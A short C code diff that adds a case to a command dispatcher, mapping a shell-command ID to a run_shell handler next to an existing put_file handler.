@@ -15,6 +15,10 @@ buffer run_command(result *res, uint64_t command_id, buffer *buf) {
             chosen_command = put_file;
             break;
 
+        case RUN_SHELL_COMMAND_ID:
+            chosen_command = run_shell;
+            break;
+
         default: HANDLE_ERROR((*res), UNKNOWN_COMMAND, "Unknown command: %llx", command_id)
     }
 
